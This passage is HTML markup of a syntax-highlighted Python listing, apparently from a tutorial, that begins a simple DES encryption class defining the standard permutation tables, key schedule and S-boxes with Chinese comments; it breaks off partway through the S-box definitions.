class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ArrangeSimpleDES</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 出初始化DES加密的参数</span></span><br><span class="line">        self.ip = [</span><br><span class="line">            <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">            <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">            <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>,</span><br><span class="line">        ]  <span class="comment"># ip置换</span></span><br><span class="line"> </span><br><span class="line">        self.ip1 = [</span><br><span class="line">            <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">            <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line">        ]  <span class="comment"># 逆ip置换</span></span><br><span class="line">        self.E = [</span><br><span class="line">            <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">            <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">            <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">            <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">            <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>,</span><br><span class="line">        ]  <span class="comment"># E置换，将32位明文置换位48位</span></span><br><span class="line">        self.P = [</span><br><span class="line">            <span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">            <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>,</span><br><span class="line">        ]  <span class="comment"># P置换，对经过S盒之后的数据再次进行置换</span></span><br><span class="line">        <span class="comment"># 设置默认密钥</span></span><br><span class="line">        self.K = <span class="string">&#x27;0111010001101000011010010111001101101001011100110110100101110110&#x27;</span></span><br><span class="line">        self.k1 = [</span><br><span class="line">            <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">            <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">            <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">            <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">            <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">        ]  <span class="comment"># 密钥的K1初始置换</span></span><br><span class="line">        self.k2 = [</span><br><span class="line">            <span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">            <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">            <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>,</span><br><span class="line">            <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>,</span><br><span class="line">            <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>,</span><br><span class="line">        ]</span><br><span class="line"> </span><br><span class="line">        self.k0 = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, ]  <span class="comment"># 秘钥循环移位的位数</span></span><br><span class="line"> </span><br><span class="line">        self.S = [</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xe</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x8</span>, <span class="number">0x3</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x3</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x3</span>, <span class="number">0xa</span>, <span class="number">0x5</span>, <span class="number">0x0</span>,</span><br><span class="line">                <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x8</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xd</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0xe</span>, <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xa</span>,</span><br><span class="line">                <span class="number">0x3</span>, <span class="number">0xd</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0xf</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0xe</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0xb</span>, <span class="number">0x5</span>,</span><br><span class="line">                <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0xa</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0xf</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0x6</span>, <span class="number">0x7</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0x6</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0xf</span>, <span class="number">0x1</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0xf</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xf</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0xb</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0xc</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0xf</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xb</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x4</span>,</span><br><span class="line">                <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0x9</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xe</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0xa</span>, <span class="number">0xb</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">                <span class="number">0xe</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0xa</span>, <span class="number">0x3</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0xf</span>, <span class="number">0x9</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0xe</span>,</span><br><span class="line">                <span class="number">0xb</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0x3</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xc</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x9</span>, <span class="number">0x2</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xb</span>,</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xb</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0xf</span>, <span class="number">0xa</span>, <span class="number">0xb</span>, <span class="number">0xe</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0xd</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0xe</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x1</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0xc</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0x8</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0xe</span>, <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0x2</span>,</span><br><span class="line">                <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x7</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0xc</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0xf</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xa</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x9</span>, <span class="number">0x2</span>,</span><br><span class="line">                <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0x9</span>, <span class="number">0xc</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x2</span>, <span class="number">0x1</span>, <span 